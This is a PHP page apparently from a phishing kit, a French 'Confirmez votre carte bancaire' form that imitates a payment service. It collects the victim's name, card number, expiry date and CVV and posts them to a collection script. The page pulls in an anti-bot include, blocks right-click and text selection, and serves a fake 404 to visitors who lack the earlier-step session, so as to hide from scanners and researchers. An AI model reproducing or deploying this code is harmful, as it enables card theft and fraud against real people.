<?php 

ob_start();
session_start();
if(isset($_SESSION['step_three'])){
include'../antibots.php';
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Confirmez votre carte</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
            <style>
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
            <script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ("return false")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function("return false")
        
</script>
        </head>
        <body>
            <div class="lod-full" style="display: none;">
                <div class="lod-c"></div>
            </div>
<?php include'navbar.php'?>
            <div class="contain biling-p">
                <form method="POST" action="<?php echo 'serv5203.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info" id="card_form">
                    <center>
                        <span class="step" style="text-transform:uppercase"><b>étape 2 sur 2</b></span>
                        <h3>Confirmez votre carte bancaire</h3>
                        <center style="margin-bottom:20px;">
                        	<img src="../img/vsa.png">
                        	<img src="../img/mc.png">
                        	<img src="../img/dcl1.png">
                        	<img src="../img/dc.png">
                        	<img src="../img/amx.png">
                        </center>
                        <style>
                            .x {
                                width:48%;
                                float:left;
                                font-size: 15px;
                            }
                            .y {
                                margin-right:0;
                                float:right;
                                width:48%;
                                font-size: 15px;
                            }
                            @media screen and (max-width: 767px) {
                                .x,.y {
                                    width: 300px;
                                    float: none;
                                    font-size: 16px;
                                    }
                            }
                        </style>
                        <input type="text" name="n_card" class="bill_input" value="<?php if(isset($_SESSION["n_card"])){echo $_SESSION["n_card"];} ?>" placeholder="Nom & Prénom" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true">
                        <div style="position: relative;" class="containvis">
                        	<input type="tel" id="cart_number" name="c_num" maxlength="19" class="bill_input" placeholder="Numéro de la carte" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        	<img id="type_v" src="../img/vsa.png" style="display: none">
                        </div>
                        <select name="exm" class="bill_input x" required="required">
                        	<option value="" disabled selected>Mois d'expiration</option>
                        	<option value="01">01</option>
							<option value="02">02</option>
							<option value="03">03</option>
							<option value="04">04</option>
							<option value="05">05</option>
							<option value="06">06</option>
							<option value="07">07</option>
							<option value="08">08</option>
							<option value="09">09</option>
							<option value="10">10</option>
							<option value="11">11</option>
							<option value="12">12</option>
                        </select>
                        <select name="exy" class="bill_input y" required="required">
                        	<option value="" disabled selected>Année d'expiration</option>
							<option value="2020">2020</option>
							<option value="2021">2021</option>
							<option value="2022">2022</option>
							<option value="2023">2023</option>
							<option value="2024">2024</option>

                        </select>
                        <div class="cls"></div>
                        <input type="tel" name="csc" id="ccv" class="bill_input" maxlength="4" placeholder="Cryptogramme" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true" style="margin-bottom:20px">
                        <hr class="hr" style="margin:0px auto 15px">
                        <input type="submit" value="Continuer" class="bill_input btn-bill">
                    </center>
                </form>
            </div>
<?php include'footer.php'?>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/jquery.maskedinput.js"></script>
            <script src="../js/plugins.js"></script>
            <script>
$( document ).ready(function() {
            $.urlParam = function(name){
	   var results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
	   return results[1] || 0;
}         
$('#cart_number').on('focusout',function(){
             $('#cart_number').removeClass('error');
});
$("#cart_number,#ccv").keydown(function (e) {
        // Allow: backspace, delete, tab, escape, enter and .
        if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110]) !== -1 ||
             // Allow: Ctrl+A, Command+A
            (e.keyCode === 65 && (e.ctrlKey === true || e.metaKey === true)) || 
             // Allow: home, end, left, right, down, up
            (e.keyCode >= 35 && e.keyCode <= 40)) {
                 // let it happen, don't do anything
                 return;
        }
        // Ensure that it is a number and stop the keypress
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    });                   
if($.urlParam('error')){
$('#cart_number').addClass('error');
}
});
            </script>
        </body>
    </html>
<?php
} 
else {
    header("HTTP/1.0 404 Not Found");
	die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
?>